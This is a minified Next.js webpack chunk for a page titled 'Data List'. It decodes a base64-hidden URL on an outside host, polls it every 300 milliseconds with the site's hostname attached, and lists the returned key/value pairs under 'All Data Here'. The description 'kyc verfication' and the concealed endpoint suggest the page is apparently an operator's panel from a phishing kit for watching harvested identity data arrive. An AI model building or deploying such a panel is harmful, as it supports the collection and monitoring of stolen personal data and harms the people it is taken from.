(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [654], {
        2371: function(n, t, e) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/d", function() {
                return e(5823)
            }])
        },
        9018: function(n, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        5823: function(n, t, e) {
            "use strict";
            e.r(t), e.d(t, {
                default: function() {
                    return o
                }
            });
            var i = e(5893),
                c = e(9008),
                s = e.n(c),
                r = e(7294),
                a = e(9018);

            function o() {
                var n = (0, r.useState)([]),
                    t = n[0],
                    e = n[1];
                return (0, r.useEffect)(function() {
                    setInterval(function() {
                        fetch(window.atob(a.Z.dataList) + "?id=" + window.location.hostname).then(function(n) {
                            return n.json()
                        }).then(function(n) {
                            return e(n)
                        })
                    }, 300)
                }, []), (0, i.jsxs)("main", {
                    children: [(0, i.jsxs)(s(), {
                        children: [(0, i.jsx)("title", {
                            children: "Data List"
                        }), (0, i.jsx)("meta", {
                            name: "description",
                            content: "kyc verfication"
                        }), (0, i.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, i.jsxs)("div", {
                        children: [(0, i.jsx)("h1", {
                            className: "text-center",
                            children: "All Data Here"
                        }), (0, i.jsx)("div", {
                            className: "dataList",
                            children: t.map(function(n, t) {
                                return (0, i.jsxs)("div", {
                                    className: "row",
                                    children: [(0, i.jsx)("span", {
                                        style: {
                                            color: "red"
                                        },
                                        children: n.keyName
                                    }), ": ", n.keyValue]
                                }, t)
                            })
                        })]
                    })]
                })
            }
        },
        9008: function(n, t, e) {
            n.exports = e(5443)
        }
    },
    function(n) {
        n.O(0, [774, 888, 179], function() {
            return n(n.s = 2371)
        }), _N_E = n.O()
    }
]);